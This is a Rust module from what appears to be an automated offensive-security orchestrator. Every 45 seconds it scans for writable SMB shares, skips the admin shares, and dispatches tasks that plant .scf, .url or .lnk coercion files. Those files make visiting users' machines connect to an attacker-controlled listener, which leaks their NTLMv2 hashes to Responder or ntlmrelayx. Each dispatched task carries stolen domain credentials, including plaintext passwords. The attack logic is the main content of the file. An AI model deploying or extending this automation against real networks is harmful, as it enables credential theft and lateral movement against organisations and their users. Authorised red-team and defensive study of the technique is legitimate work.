//! auto_share_coercion -- drop coercion files (.scf, .url, .lnk) on writable
//! shares to capture NTLMv2 hashes via Responder/ntlmrelayx.
//!
//! When a user browses to a share containing one of these files, Windows
//! automatically connects back to the attacker-controlled listener, leaking the
//! user's NTLMv2 hash. This is a passive credential harvesting technique.
//!
//! Requires: writable shares discovered by share_enum, a listener IP for the
//! UNC path in the coercion file, and Responder running on the listener.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Monitors for writable shares and dispatches coercion file drops.
/// Interval: 45s.
pub async fn auto_share_coercion(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("share_coercion") {
            continue;
        }

        let listener = match dispatcher.config.listener_ip.as_deref() {
            Some(ip) => ip.to_string(),
            None => continue, // need listener for UNC path in coercion files
        };

        let work: Vec<ShareCoercionWork> = {
            let state = dispatcher.state.read().await;

            if state.credentials.is_empty() {
                continue;
            }

            let cred = match state.credentials.first() {
                Some(c) => c.clone(),
                None => continue,
            };

            state
                .shares
                .iter()
                .filter(|s| {
                    let perms = s.permissions.to_uppercase();
                    perms == "WRITE" || perms == "READ/WRITE" || perms.contains("WRITE")
                })
                .filter(|s| {
                    // Skip default admin/system shares
                    let name_upper = s.name.to_uppercase();
                    !matches!(
                        name_upper.as_str(),
                        "C$" | "ADMIN$" | "IPC$" | "PRINT$" | "SYSVOL" | "NETLOGON"
                    )
                })
                .filter(|s| {
                    let dedup_key = format!("{}:{}", s.host, s.name);
                    !state.is_processed(DEDUP_WRITABLE_SHARES, &dedup_key)
                })
                .map(|s| ShareCoercionWork {
                    host: s.host.clone(),
                    share_name: s.name.clone(),
                    listener: listener.clone(),
                    credential: cred.clone(),
                })
                .take(3) // limit per cycle to avoid flooding
                .collect()
        };

        for item in work {
            let payload = json!({
                "technique": "share_coercion",
                "target_ip": item.host,
                "share_name": item.share_name,
                "listener_ip": item.listener,
                "credential": {
                    "username": item.credential.username,
                    "password": item.credential.password,
                    "domain": item.credential.domain,
                },
            });

            let priority = dispatcher.effective_priority("share_coercion");
            match dispatcher
                .throttled_submit("coercion", "coercion", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        host = %item.host,
                        share = %item.share_name,
                        "Share coercion file drop dispatched"
                    );

                    let dedup_key = format!("{}:{}", item.host, item.share_name);
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_WRITABLE_SHARES, dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_WRITABLE_SHARES, &dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(
                        host = %item.host,
                        share = %item.share_name,
                        "Share coercion task deferred by throttler"
                    );
                }
                Err(e) => {
                    warn!(
                        err = %e,
                        host = %item.host,
                        share = %item.share_name,
                        "Failed to dispatch share coercion"
                    );
                }
            }
        }
    }
}

struct ShareCoercionWork {
    host: String,
    share_name: String,
    listener: String,
    credential: ares_core::models::Credential,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dedup_key_format() {
        let key = format!("{}:{}", "192.168.58.22", "Users");
        assert_eq!(key, "192.168.58.22:Users");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_WRITABLE_SHARES, "writable_shares");
    }

    #[test]
    fn admin_shares_filtered() {
        let admin_shares = ["C$", "ADMIN$", "IPC$", "PRINT$", "SYSVOL", "NETLOGON"];
        for name in &admin_shares {
            let name_upper = name.to_uppercase();
            assert!(
                matches!(
                    name_upper.as_str(),
                    "C$" | "ADMIN$" | "IPC$" | "PRINT$" | "SYSVOL" | "NETLOGON"
                ),
                "{name} should be filtered"
            );
        }
    }
}
